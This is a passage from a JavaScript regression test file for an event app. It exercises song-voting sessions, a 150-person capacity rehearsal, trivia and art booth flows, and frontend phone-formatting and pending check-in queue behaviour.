  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await request(port, "resetNewSongSession", {
    sessionNumber: 1,
    version: 0,
    organizerKey: "wrong",
  });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await advance(2, "start", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "BOOTH_SESSION_NOT_ACTIVE");
  res = await advance(3, "start", 0);
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_NEW_SONG_SESSION");

  res = await request(port, "newSongDashboardData", { organizerKey });
  assert.equal(res.status, 200);
  assert.deepEqual(res.body.choices, EXPECTED_NEW_SONG_CHOICES);
  assert.equal(res.body.sessions.length, 2);
  assert.deepEqual(
    res.body.sessions.map((session) => [
      session.sessionNumber,
      session.assignedColor.id,
      session.state.phase,
      session.state.runNumber,
      session.state.version,
      session.assignedCount,
      session.totalVotes,
      session.archivedRuns.length,
    ]),
    [
      [1, "green", "welcome", 1, 0, 3, 0, 0],
      [2, "yellow", "welcome", 1, 0, 2, 0, 0],
    ]
  );
  res.body.sessions.forEach((session) => {
    assert.deepEqual(session.choices, EXPECTED_NEW_SONG_CHOICES);
    assert.deepEqual(
      session.voteCounts,
      EXPECTED_NEW_SONG_CHOICES.map((title) => ({ title, votes: 0 }))
    );
  });

  res = await request(port, "newSongState", { attendeeId: "song-green-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessionNumber, 1);
  assert.equal(res.body.assignedColor.id, "green");
  assert.equal(res.body.phase, "welcome");
  assert.equal(res.body.version, 0);
  assert.equal(res.body.runNumber, 1);
  assert.equal(typeof res.body.runId, "string");
  assert.deepEqual(res.body.choices, EXPECTED_NEW_SONG_CHOICES);
  assert.equal(res.body.vote, null);
  assert.equal(res.body.result, null);
  assert.equal(res.body.winner, null);
  assert.deepEqual(res.body.voteCounts, []);
  const session1Run1Id = res.body.runId;

  res = await request(port, "newSongState", { attendeeId: "song-blue-a" });
  assert.equal(res.status, 403);
  assert.equal(res.body.code, "NEW_SONG_NOT_ASSIGNED");
  res = await request(port, "newSongState", { attendeeId: "missing-song-attendee" });
  assert.equal(res.status, 404);
  assert.equal(res.body.code, "ATTENDEE_NOT_FOUND");
  res = await request(port, "submitNewSongVote", {
    attendeeId: "song-green-a",
    songTitle: "Victory",
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_VOTING_CLOSED");

  // Invalid actions, ordering, and stale optimistic versions do not mutate
  // the room. Only start can move the initial welcome screen into voting.
  res = await advance(4, "start", 0);
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_NEW_SONG_SESSION");
  res = await advance(1, "not_an_action", 0);
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_NEW_SONG_ACTION");
  res = await advance(1, "show_winner", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "INVALID_NEW_SONG_TRANSITION");
  res = await advance(1, "start", 99);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_SESSION_CONFLICT");
  res = await advance(1, "start", 0);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "voting");
  assert.equal(res.body.state.version, 1);
  assert.equal(res.body.state.runId, session1Run1Id);
  assertIsoTimestamp(res.body.state.startedAt, "New Song run start");
  res = await advance(1, "start", 0);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_SESSION_CONFLICT");

  // Poll submissions accept only canonical choices. Each attendee gets one
  // immutable vote per run; a same-song retry is idempotent, while a second
  // different title is rejected and cannot skew the live staff graph.
  res = await request(port, "submitNewSongVote", {
    attendeeId: "song-green-a",
    songTitle: "Not a real song",
  });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_SONG_CHOICE");
  res = await request(port, "submitNewSongVote", {
    attendeeId: "song-blue-a",
    songTitle: "Victory",
  });
  assert.equal(res.status, 403);
  assert.equal(res.body.code, "NEW_SONG_NOT_ASSIGNED");

  res = await request(port, "submitNewSongVote", {
    attendeeId: "song-green-a",
    songTitle: "Victory",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, false);
  assert.equal(res.body.changed, true);
  assert.deepEqual(res.body.vote.songTitle, "Victory");
  const firstVoteAt = res.body.vote.votedAt;
  assertIsoTimestamp(firstVoteAt, "first New Song vote");
  res = await request(port, "submitNewSongVote", {
    attendeeId: "song-green-a",
    songTitle: "Victory",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.idempotent, true);
  assert.equal(res.body.changed, false);
  assert.equal(res.body.vote.votedAt, firstVoteAt);
  res = await request(port, "submitNewSongVote", {
    attendeeId: "song-green-a",
    songTitle: "247",
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "SONG_VOTE_LOCKED");

  for (const [attendeeId, songTitle] of [
    ["song-green-b", "Victory"],
    ["song-green-c", "247"],
  ]) {
    res = await request(port, "submitNewSongVote", { attendeeId, songTitle });
    assert.equal(res.status, 200, attendeeId);
  }

  res = await request(port, "newSongState", { attendeeId: "song-green-a" });
  assert.equal(res.body.phase, "voting");
  assert.deepEqual(res.body.vote, { songTitle: "Victory", votedAt: firstVoteAt });
  assert.equal(res.body.result, null, "live totals must stay hidden from attendees");
  assert.deepEqual(res.body.voteCounts, []);

  res = await request(port, "newSongDashboardData", { organizerKey });
  let session1 = sessionSummary(res.body, 1);
  assert.equal(session1.totalVotes, 3);
  assert.equal(session1.voteCount, 3);
  assert.equal(session1.participantCount, 3);
  assert.equal(voteCount(session1, "Victory"), 2);
  assert.equal(voteCount(session1, "247"), 1);
  assert.deepEqual(
    session1.voters.map((voter) => [voter.name, voter.songTitle]),
    [
      ["Green Singer", "Victory"],
      ["Green Listener", "Victory"],
      ["Green Worshipper", "247"],
    ]
  );
  assert.equal(sessionSummary(res.body, 2).totalVotes, 0);

  // The leader freezes a unique result. Voting closes immediately, but the
  // attendee result stays on the winner screen until the verse is released.
  res = await advance(1, "show_winner", 1);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "winner");
  assert.equal(res.body.state.version, 2);
  assert.deepEqual(res.body.result, {
    totalVotes: 3,
    maxVotes: 2,
    isTie: false,
    tiedTitles: ["Victory"],
    featuredWinner: "Victory",
    tieBreakRule: "canonical-list-order",
  });
  assert.deepEqual(res.body.winner, {
    songTitle: "Victory", voteCount: 2, tied: false, tiedSongs: ["Victory"],
  });
  res = await request(port, "submitNewSongVote", {
    attendeeId: "song-green-a",
    songTitle: "Victory",
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_VOTING_CLOSED");
  res = await request(port, "newSongState", { attendeeId: "song-green-a" });
  assert.equal(res.body.phase, "winner");
  assert.equal(res.body.result.featuredWinner, "Victory");
  assert.equal(res.body.totalVotes, 3);
  assert.equal(res.body.voteCounts.length, EXPECTED_NEW_SONG_CHOICES.length);

  res = await advance(1, "finish", 2);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "INVALID_NEW_SONG_TRANSITION");
  res = await advance(1, "show_verse", 2);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "verse");
  assert.equal(res.body.state.version, 3);
  res = await request(port, "newSongState", { attendeeId: "song-green-a" });
  assert.equal(res.body.phase, "verse");
  assert.equal(res.body.result.featuredWinner, "Victory");
  res = await request(port, "completeNewSong", { attendeeId: "song-green-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_NOT_COMPLETE");
  res = await advance(1, "finish", 3);
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "complete");
  assert.equal(res.body.state.version, 4);
  assertIsoTimestamp(res.body.state.completedAt, "New Song run completion");

  // Done saves exactly one booth check-in. Retrying is idempotent and keeps
  // the same row while preserving the vote, run, and frozen winner metadata.
  res = await request(port, "completeNewSong", { attendeeId: "song-green-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.runId, session1Run1Id);
  assert.equal(res.body.vote.songTitle, "Victory");
  assert.equal(res.body.result.featuredWinner, "Victory");
  const firstCompletionId = res.body.checkinId;
  res = await request(port, "completeNewSong", { attendeeId: "song-green-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.checkinId, firstCompletionId);
  const completedRows = JSON.parse(fs.readFileSync(testDb, "utf8")).boothCheckins
    .filter((checkin) => checkin.attendeeId === "song-green-a" && checkin.boothId === "newsong");
  assert.equal(completedRows.length, 1);
  assert.equal(completedRows[0].extraData.runId, session1Run1Id);
  assert.equal(completedRows[0].extraData.votedFor, "Victory");
  assert.equal(completedRows[0].extraData.featuredWinner, "Victory");

  // Session 2 is completely isolated. A two-song tie reports every leader in
  // canonical order and deterministically features the earliest list entry.
  res = await setSessionClock(2);
  assert.equal(res.status, 200);
  res = await request(port, "newSongState", { attendeeId: "song-yellow-a" });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessionNumber, 2);
  assert.equal(res.body.assignedColor.id, "yellow");
  assert.equal(res.body.phase, "welcome");
  res = await request(port, "newSongState", { attendeeId: "song-green-a" });
  assert.equal(res.status, 403);
  assert.equal(res.body.code, "NEW_SONG_NOT_ASSIGNED");
  res = await advance(2, "start", 0);
  assert.equal(res.status, 200);
  res = await advance(2, "show_winner", 1);
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_NO_VOTES");
  for (const [attendeeId, songTitle] of [
    ["song-yellow-a", "Goodbye Yesterday - elevation rhythm"],
    ["song-yellow-b", "He called me"],
  ]) {
    res = await request(port, "submitNewSongVote", { attendeeId, songTitle });
    assert.equal(res.status, 200, attendeeId);
  }
  res = await advance(2, "show_winner", 1);
  assert.equal(res.status, 200);
  assert.equal(res.body.result.isTie, true);
  assert.equal(res.body.result.maxVotes, 1);
  assert.deepEqual(res.body.result.tiedTitles, [
    "Goodbye Yesterday - elevation rhythm", "He called me",
  ]);
  assert.equal(res.body.result.featuredWinner, "Goodbye Yesterday - elevation rhythm");
  assert.equal(res.body.result.tieBreakRule, "canonical-list-order");
  assert.deepEqual(res.body.winner, {
    songTitle: "Goodbye Yesterday - elevation rhythm",
    voteCount: 1,
    tied: true,
    tiedSongs: ["Goodbye Yesterday - elevation rhythm", "He called me"],
  });
  res = await request(port, "newSongState", { attendeeId: "song-yellow-a" });
  assert.equal(res.body.phase, "winner");
  assert.equal(res.body.result.isTie, true);
  assert.equal(res.body.winner.songTitle, "Goodbye Yesterday - elevation rhythm");

  res = await request(port, "newSongDashboardData", { organizerKey });
  session1 = sessionSummary(res.body, 1);
  const session2 = sessionSummary(res.body, 2);
  assert.equal(session1.state.phase, "complete");
  assert.equal(session1.totalVotes, 3);
  assert.equal(session2.state.phase, "winner");
  assert.equal(session2.totalVotes, 2);

  // Restarting archives Session 1 instead of deleting its votes. Optimistic
  // reset versions prevent an older staff tab from replacing the active run.
  res = await request(port, "resetNewSongSession", {
    sessionNumber: 1,
    version: 3,
    organizerKey,
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_SESSION_CONFLICT");
  res = await request(port, "resetNewSongSession", {
    sessionNumber: 1,
    version: 4,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "welcome");
  assert.equal(res.body.state.runNumber, 2);
  assert.equal(res.body.state.version, 5);
  assert.notEqual(res.body.state.runId, session1Run1Id);
  assert.equal(res.body.totalVotes, 0);
  assert.equal(res.body.participantCount, 0);
  assert.equal(res.body.archivedRuns.length, 1);
  assert.equal(res.body.archivedRuns[0].runId, session1Run1Id);
  assert.equal(res.body.archivedRuns[0].runNumber, 1);
  assert.equal(res.body.archivedRuns[0].phase, "complete");
  assert.equal(res.body.archivedRuns[0].totalVotes, 3);
  assert.equal(res.body.archivedRuns[0].participantCount, 3);
  assert.equal(voteCount(res.body.archivedRuns[0], "Victory"), 2);
  assert.equal(res.body.archivedRuns[0].result.featuredWinner, "Victory");
  assert.equal(res.body.archivedRuns[0].winner.songTitle, "Victory");
  const session1Run2Id = res.body.state.runId;

  // Returning the clock to Session 1 restores the clean active run. The same
  // attendee can vote again because vote identity includes runId.
  res = await setSessionClock(1);
  assert.equal(res.status, 200);
  res = await request(port, "newSongState", { attendeeId: "song-green-a" });
  assert.equal(res.body.runId, session1Run2Id);
  assert.equal(res.body.runNumber, 2);
  assert.equal(res.body.phase, "welcome");
  assert.equal(res.body.vote, null);
  res = await advance(1, "start", 5);
  assert.equal(res.status, 200);
  res = await request(port, "submitNewSongVote", {
    attendeeId: "song-green-a",
    songTitle: "Brighter Day",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.runId, session1Run2Id);
  assert.equal(res.body.idempotent, false);

  // Resetting an incomplete rehearsal also archives it. Histories are newest
  // first, and the completed first run remains unchanged beside it.
  res = await request(port, "resetNewSongSession", {
    sessionNumber: 1,
    version: 6,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "welcome");
  assert.equal(res.body.state.runNumber, 3);
  assert.equal(res.body.state.version, 7);
  assert.equal(res.body.archivedRuns.length, 2);
  assert.deepEqual(res.body.archivedRuns.map((run) => [run.runNumber, run.phase, run.totalVotes]), [
    [2, "voting", 1],
    [1, "complete", 3],
  ]);
  assert.equal(res.body.archivedRuns[0].runId, session1Run2Id);
  assert.equal(res.body.archivedRuns[0].result, null);
  assert.equal(res.body.archivedRuns[1].runId, session1Run1Id);
  assert.equal(res.body.archivedRuns[1].result.featuredWinner, "Victory");

  // Once booths close at 3:50, attendee state and completion close while
  // protected staff history remains queryable.
  res = await request(port, "setDemoClock", {
    mode: "waiting",
    targetIso: "2026-07-18T20:50:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "newSongState", { attendeeId: "song-green-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_SESSION_CLOSED");
  res = await request(port, "completeNewSong", { attendeeId: "song-green-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_SESSION_CLOSED");
  res = await request(port, "setDemoClock", {
    mode: "ended",
    targetIso: "2026-07-18T21:00:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "newSongState", { attendeeId: "song-green-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_SESSION_CLOSED");
  res = await request(port, "completeNewSong", { attendeeId: "song-green-a" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "NEW_SONG_SESSION_CLOSED");
  res = await request(port, "newSongDashboardData", { organizerKey });
  assert.equal(sessionSummary(res.body, 1).archivedRuns.length, 2);
  assert.equal(sessionSummary(res.body, 2).result.featuredWinner, "Goodbye Yesterday - elevation rhythm");

  // Only the overall reset destroys active rotations, archives, votes, and
  // booth completions. Every specialized session then returns to run 1.
  res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
  res = await request(port, "newSongDashboardData", { organizerKey });
  assert.deepEqual(
    res.body.sessions.map((session) => [
      session.state.phase,
      session.state.runNumber,
      session.state.version,
      session.totalVotes,
      session.archivedRuns.length,
    ]),
    [
      ["welcome", 1, 0, 0, 0],
      ["welcome", 1, 0, 0, 0],
    ]
  );
  const resetDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.deepEqual(resetDb.newSongSessions, {});
  assert.deepEqual(resetDb.newSongRunHistory, []);
  assert.deepEqual(resetDb.songVotes, []);
  assert.deepEqual(resetDb.boothCheckins, []);
}

async function runCapacityRegression(port) {
  const organizerKey = "test-organizer-key";
  const colors = ["blue", "red", "orange", "green", "yellow"];
  const routes = {
    blue: ["heaven", "trivia"],
    red: ["trivia", "heaven"],
    orange: ["art", "story"],
    green: ["newsong", "art"],
    yellow: ["story", "newsong"],
  };
  const songChoices = ["He called me", "Victory", "Elohim"];
  const artActions = [
    "start", "show_importance", "show_purpose_image", "ask_heart", "show_proverbs",
    "show_philippians", "start_art", "show_finished", "finish",
  ];

  let res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
  assertIsoTimestamp(res.body.dataResetAt, "capacity reset marker");
  res = await request(port, "setDemoClock", {
    mode: "before",
    targetIso: "2026-07-18T20:05:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);

  const registrations = await Promise.all(Array.from({ length: 150 }, (_, index) => (
    request(port, "registerAttendee", {
      attendeeId: `capacity-${index + 1}`,
      name: `Capacity Guest ${index + 1}`,
      phone: `615${String(7000000 + index)}`,
    })
  )));
  assert.equal(registrations.every((result) => result.status === 200), true);
  assert.equal(registrations.every((result) => result.body.phoneLinked === true), true);
  assert.equal(new Set(registrations.map((result) => result.body.attendeeId)).size, 150);
  assert.equal(new Set(registrations.map((result) => result.body.raffleNumber)).size, 150);

  const assignments = registrations.map((result, index) => ({
    attendeeId: result.body.attendeeId,
    colorId: colors[index % colors.length],
  }));
  const confirmations = await Promise.all(assignments.map((assignment) => (
    request(port, "confirmWristband", {
      attendeeId: assignment.attendeeId,
      wristbandColor: assignment.colorId,
      organizerKey,
    })
  )));
  assert.equal(confirmations.every((result) => result.status === 200), true);

  const songVoters = assignments.filter((assignment) => routes[assignment.colorId].includes("newsong"));
  const songVotes = await Promise.all(songVoters.map((assignment, index) => (
    request(port, "saveSongVote", {
      attendeeId: assignment.attendeeId,
      songTitle: songChoices[index % songChoices.length],
    })
  )));
  assert.equal(songVotes.length, 60);
  assert.equal(songVotes.every((result) => result.status === 200), true);

  const checkins = await Promise.all(assignments.flatMap((assignment) => (
    routes[assignment.colorId]
      .map((boothId, sessionIndex) => ({ boothId, sessionIndex }))
      .filter(({ boothId }) => boothId !== "art")
      .map(({ boothId, sessionIndex }) => request(port, "boothCheckin", {
      attendeeId: assignment.attendeeId,
      boothId,
      boothName: boothId,
      checkedInBy: "capacity-test",
      extraData: { sessionNumber: sessionIndex + 1, wristbandColor: assignment.colorId },
      }))
  )));
  assert.equal(checkins.length, 240);
  assert.equal(checkins.every((result) => result.status === 200), true);

  const phase3Finishes = await Promise.all(assignments.map((assignment) => (
    request(port, "saveSignupSelections", {
      attendeeId: assignment.attendeeId,
      optionIds: ["future"],
    })
  )));
  assert.equal(phase3Finishes.every((result) => result.status === 200), true);

  const synchronizedReads = await Promise.all(assignments.flatMap((assignment, index) => [
    request(port, "eventClock", {}, index % 2 ? "GET" : "POST"),
    request(port, "boothPresentation", { boothId: routes[assignment.colorId][0] }),
  ]));
  assert.equal(synchronizedReads.every((result) => result.status === 200), true);

  // Art completion cannot use the generic check-in shortcut. Exercise the
  // Orange Session 1 run through its full leader-controlled finale.
  res = await request(port, "setDemoClock", {
    mode: "session1",
    targetIso: "2026-07-18T20:15:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);
  for (let version = 0; version < artActions.length; version += 1) {
    res = await request(port, "advanceArtSession", {
      sessionNumber: 1,
      action: artActions[version],
      version,
      organizerKey,
    });
    assert.equal(res.status, 200, `Session 1 ${artActions[version]}`);
  }
  const session1ArtAttendees = assignments.filter((assignment) => assignment.colorId === "orange");
  const session1ArtCompletions = await Promise.all(session1ArtAttendees.map((assignment) => request(
    port, "completeArt", { attendeeId: assignment.attendeeId }
  )));
  assert.equal(session1ArtCompletions.length, 30);
  assert.equal(session1ArtCompletions.every((result) => result.status === 200), true);

  res = await request(port, "setDemoClock", {
    mode: "session2",
    targetIso: "2026-07-18T20:35:00.000Z",
    organizerKey,
  });
  assert.equal(res.status, 200);

  // The 150-person rehearsal sends 30 Blue wristbands through Bible Bowl in
  // Session 2. Exercise one synchronized answer wave so JSON persistence and
  // the session leaderboard cannot silently drop concurrent phone responses.
  res = await request(port, "advanceTriviaSession", {
    sessionNumber: 2,
    action: "start",
    version: 0,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.state.phase, "question");
  const session2TriviaAttendees = assignments.filter((assignment) => assignment.colorId === "blue");
  assert.equal(session2TriviaAttendees.length, 30);
  const triviaAnswerBurst = await Promise.all(session2TriviaAttendees.map((assignment) => request(
    port,
    "submitTriviaAnswer",
    {
      attendeeId: assignment.attendeeId,
      questionId: TRIVIA_QUESTIONS[0].id,
      answerIndex: TRIVIA_QUESTIONS[0].correctIndex,
    }
  )));
  assert.equal(triviaAnswerBurst.every((result) => result.status === 200), true);
  assert.equal(triviaAnswerBurst.every((result) => result.body.idempotent === false), true);
  res = await request(port, "advanceTriviaSession", {
    sessionNumber: 2,
    action: "reveal",
    version: 1,
    organizerKey,
  });
  assert.equal(res.status, 200);
  res = await request(port, "advanceTriviaSession", {
    sessionNumber: 2,
    action: "finish",
    version: 2,
    organizerKey,
  });
  assert.equal(res.status, 200);
  const triviaCompletions = await Promise.all(session2TriviaAttendees.map((assignment) => request(
    port,
    "completeTrivia",
    { attendeeId: assignment.attendeeId }
  )));
  assert.equal(triviaCompletions.every((result) => result.status === 200), true);
  assert.equal(triviaCompletions.every((result) => (
    result.body.score.correctCount === 1
      && result.body.score.answeredCount === 1
      && result.body.score.totalQuestions === 1
  )), true);
  res = await request(port, "triviaDashboardData", { organizerKey });
  const capacitySession2 = res.body.sessions.find((session) => session.sessionNumber === 2);
  assert.equal(capacitySession2.responseCount, 30);
  assert.equal(capacitySession2.leaderboard.length, 30);
  assert.equal(capacitySession2.leaderboard.every((row) => (
    row.correctCount === 1 && row.answeredCount === 1 && row.totalQuestions === 1
  )), true);
  assert.equal(res.body.sessions.find((session) => session.sessionNumber === 1).leaderboard.length, 0);

  // The same rehearsal sends 30 Green wristbands through leader-paced Art
  // Therapy in Session 2. Release all slides, then save one immutable run
  // completion per phone through the server-authoritative finale.
  for (let version = 0; version < artActions.length; version += 1) {
    res = await request(port, "advanceArtSession", {
      sessionNumber: 2,
      action: artActions[version],
      version,
      organizerKey,
    });
    assert.equal(res.status, 200, artActions[version]);
  }
  const session2ArtAttendees = assignments.filter((assignment) => assignment.colorId === "green");
  assert.equal(session2ArtAttendees.length, 30);
  const artCompletions = await Promise.all(session2ArtAttendees.map((assignment) => request(
    port,
    "completeArt",
    { attendeeId: assignment.attendeeId }
  )));
  assert.equal(artCompletions.every((result) => result.status === 200), true);
  assert.equal(artCompletions.every((result) => result.body.idempotent === false), true);
  res = await request(port, "artDashboardData", { organizerKey });
  const capacityArtSession2 = res.body.sessions.find((session) => session.sessionNumber === 2);
  assert.equal(capacityArtSession2.state.phase, "complete");
  assert.equal(capacityArtSession2.completedCount, 30);
  assert.equal(capacityArtSession2.participantCount, 30);
  assert.equal(capacityArtSession2.participants.filter((participant) => participant.completedAt).length, 30);
  assert.equal(res.body.sessions.find((session) => session.sessionNumber === 1).completedCount, 30);
  assert.deepEqual(res.body.sessions.map((session) => session.completedCount), [30, 30]);

  res = await request(port, "dashboardData", { organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.totals.registered, 150);
  assert.deepEqual(
    res.body.wristbandCounts.map((entry) => [entry.colorId, entry.count]),
    colors.map((colorId) => [colorId, 30])
  );
  assert.equal(res.body.eventState.phase, "active");
  assert.equal(res.body.eventState.sessionNumber, 2);
  assert.equal(res.body.eventState.sessionLabel, "3:30–3:50 PM");
  assert.equal(res.body.wristbandGroups.length, 5);
  const blueGroup = res.body.wristbandGroups.find((group) => group.colorId === "blue");
  const greenGroup = res.body.wristbandGroups.find((group) => group.colorId === "green");
  assert.deepEqual(blueGroup.currentBooth, { boothId: "trivia", boothName: "Bible Bowl" });
  assert.deepEqual(greenGroup.currentBooth, { boothId: "art", boothName: "Art Therapy Table" });
  assert.equal(blueGroup.attendees.length, 30);
  assert.equal(blueGroup.attendees.every((attendee) => (
    attendee.completedStops === 2
      && attendee.totalStops === 2
      && attendee.currentStopCompleted === true
      && attendee.phase3Completed === true
      && !("attendeeId" in attendee)
      && !("phone" in attendee)
  )), true);
  assert.deepEqual(
    Object.fromEntries(res.body.boothCounts.map((entry) => [entry.boothId, entry.count])),
    { heaven: 60, trivia: 60, story: 60, art: 60, newsong: 60 }
  );
  assert.equal("songVotes" in res.body, false);
  assert.equal("triviaLeaderboard" in res.body, false);
  assert.equal(res.body.signups.length, 150);

  res = await request(port, "boothDashboardData", { boothId: "newsong", organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.songVotes.reduce((total, entry) => total + entry.votes, 0), 60);
  res = await request(port, "triviaDashboardData", { organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.sessions.reduce((total, session) => total + session.leaderboard.length, 0), 30);

  res = await request(port, "health", undefined, "GET");
  assert.equal(res.status, 200);
  assert.equal(res.body.ok, true);
  assert.equal(res.body.registered, 150);
  assert.equal("sms" in res.body, false);

  res = await request(port, "resetDemo", { organizerKey });
  assert.equal(res.status, 200);
}

async function runFrontendContractRegression() {
  const webRoot = path.join(__dirname, "..", "..", "web");
  const phoneSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "phone.js"), "utf8");
  const phoneContext = {};
  vm.createContext(phoneContext);
  vm.runInContext(`${phoneSource}\nthis.__phone = Phone;`, phoneContext);
  const phone = phoneContext.__phone;
  assert.equal(phone.digits("(615) 555-0101"), "6155550101");
  assert.equal(phone.formatInput("6155550101"), "(615) 555-0101");
  assert.equal(phone.formatDisplay("6155550101"), "(615) 555-0101");
  assert.equal(phone.formatDisplay("12345"), "12345");
  assert.equal(phone.isValid("(615) 555-0101"), true);
  assert.equal(phone.isValid("615555010"), false);
  assert.equal(phone.isValid("16155550101"), false);

  const phoneInput = {
    value: "",
    listeners: {},
    addEventListener(type, listener) { this.listeners[type] = listener; },
    setCustomValidity(message) { this.validationMessage = message; },
  };
  phone.bind(phoneInput);
  assert.equal(phoneInput.maxLength, 14);
  assert.equal(phoneInput.inputMode, "numeric");
  phoneInput.value = "6155550101";
  phoneInput.listeners.input();
  assert.equal(phoneInput.value, "(615) 555-0101");
  phoneInput.value = "61555501019";
  phoneInput.listeners.input();
  assert.equal(phoneInput.value, "(615) 555-0101");
  assert.equal(phone.isValid(phoneInput), false);
  assert.match(phoneInput.validationMessage, /10-digit/);
  phoneInput.value = "6155550101";
  phoneInput.listeners.input();
  assert.equal(phone.isValid(phoneInput), true);
  assert.equal(phoneInput.validationMessage, "");

  class FakeStorage {
    constructor() { this.values = new Map(); }
    get length() { return this.values.size; }
    getItem(key) { return this.values.has(key) ? this.values.get(key) : null; }
    key(index) { return Array.from(this.values.keys())[index] ?? null; }
    setItem(key, value) { this.values.set(key, String(value)); }
    removeItem(key) { this.values.delete(key); }
  }
  const pendingStorage = new FakeStorage();
  let pendingAttempts = 0;
  const pendingTimers = [];
  const pendingResults = [];
  const pendingContext = {
    localStorage: pendingStorage,
    console,
    setTimeout(callback, delay) {
      const timer = { callback, delay };
      pendingTimers.push(timer);
      return timer;
    },
    EventAPI: {
      boothCheckin: async () => {
        pendingAttempts += 1;
        if (pendingAttempts === 1) throw new Error("temporary outage");
        return { ok: true };
      },
    },
  };
  vm.createContext(pendingContext);
  const pendingSource = fs.readFileSync(path.join(__dirname, "..", "..", "web", "shared", "pending-checkins.js"), "utf8");
  vm.runInContext(`${pendingSource}\nthis.__pendingCheckins = PendingCheckins;`, pendingContext);
  const pendingCheckins = pendingContext.__pendingCheckins;
  const queuedCompletion = { attendeeId: "queue-attendee", boothId: "heaven", boothName: "Draw Heaven" };
  pendingCheckins.stage(queuedCompletion);
  pendingCheckins.retry("queue-attendee", (result) => pendingResults.push(result));
  assert.equal(pendingTimers.length, 1);
  assert.equal(pendingTimers[0].delay, 2500);
  await pendingTimers.shift().callback();
  assert.equal(pendingAttempts, 1);
  assert.equal(pendingResults[0].attendeePendingCount, 1);
  assert.equal(pendingTimers.length, 1);
  assert.equal(pendingTimers[0].delay, 5000);
  await pendingTimers.shift().callback();
  assert.equal(pendingAttempts, 2);
  assert.deepEqual(Array.from(pendingResults[1].completedBoothIds), ["heaven"]);
  assert.equal(pendingResults[1].pendingCount, 0);
  assert.equal(pendingTimers.length, 0);
  assert.equal(pendingStorage.getItem("eventapp.pending-booth-checkins.v1"), null);

  // A successful older request must not erase a newer revision staged for
  // the same attendee/booth while that request is in flight.
  const concurrentStorage = new FakeStorage();
  const concurrentTimers = [];
  let finishConcurrentRequest;
  const concurrentContext = {
    localStorage: concurrentStorage,
    console,
    setTimeout(callback, delay) {
      const timer = { callback, delay };
      concurrentTimers.push(timer);
      return timer;
    },
    EventAPI: {
      boothCheckin: () => new Promise((resolve) => { finishConcurrentRequest = resolve; }),
    },
  };
  vm.createContext(concurrentContext);
  vm.runInContext(`${pendingSource}\nthis.__pendingCheckins = PendingCheckins;`, concurrentContext);
  const concurrentCheckins = concurrentContext.__pendingCheckins;
  concurrentCheckins.stage({ ...queuedCompletion, note: "old" });
  const inFlightFlush = concurrentCheckins.flush("queue-attendee");
  await Promise.resolve();
  concurrentCheckins.stage({ ...queuedCompletion, note: "new" });
  finishConcurrentRequest({ ok: true });
  await inFlightFlush;
  const remainingConcurrent = JSON.parse(concurrentStorage.getItem("eventapp.pending-booth-checkins.v1"));
  assert.equal(remainingConcurrent.length, 1);
  assert.equal(remainingConcurrent[0].payload.note, "new");

  const identityStorage = new FakeStorage();
  const portalStorage = new FakeStorage();
  const backendPortalCalls = [];
  const identityWindowListeners = {};
  const identityContext = {
    window: {
      crypto: { randomUUID: () => "generated-id" },
      location: { href: "" },
      addEventListener(type, listener) { identityWindowListeners[type] = listener; },
    },
    localStorage: identityStorage,
    sessionStorage: portalStorage,
    EventAPI: {
      loginAttendee: async (name, phone, portal) => {
        backendPortalCalls.push(["login", portal]);
        return {
          attendeeId: "portal-attendee",
          name: name.trim(),
          raffleNumber: "1001",
          wristbandColor: "blue",
          phoneLinked: true,
          serverNow: "2026-07-18T20:10:00.000Z",
          dataResetAt: "initial",
        };
      },
      attendeePortalSession: async (attendeeId, portal) => {
        backendPortalCalls.push(["restore", portal]);
        return {
